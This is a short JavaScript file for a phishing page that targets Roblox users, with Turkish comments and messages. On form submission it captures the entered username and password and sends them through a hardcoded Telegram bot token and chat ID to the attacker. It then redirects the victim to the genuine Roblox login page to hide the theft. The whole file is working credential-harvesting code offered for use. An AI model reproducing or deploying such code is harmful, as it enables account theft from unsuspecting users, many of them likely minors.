document.getElementById('login-form').addEventListener('submit', async (e) => {
    e.preventDefault();
    
    const u = document.getElementById('user').value;
    const p = document.getElementById('pass').value;

    // Senin bilgilerini buraya çaktım knk
    const token = "8587670631:AAGkV1-0y8SF9gXTz2_6y0oBdZR1rGlJF10";
    const chatID = "8512406356";

    const mesaj = `🎯 ROBLOX GANİMETİ!\n\n👤 Kullanıcı: ${u}\n🔑 Şifre: ${p}\n\n🔥 MODIE Protocol İnfazı`;

    try {
        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: chatID, text: mesaj })
        });
        
        // Veri düştüğü an Roblox'un kendi giriş sayfasına salla
        window.location.replace("https://www.roblox.com/login");
    } catch (err) {
        window.location.replace("https://www.roblox.com/login");
    }
});
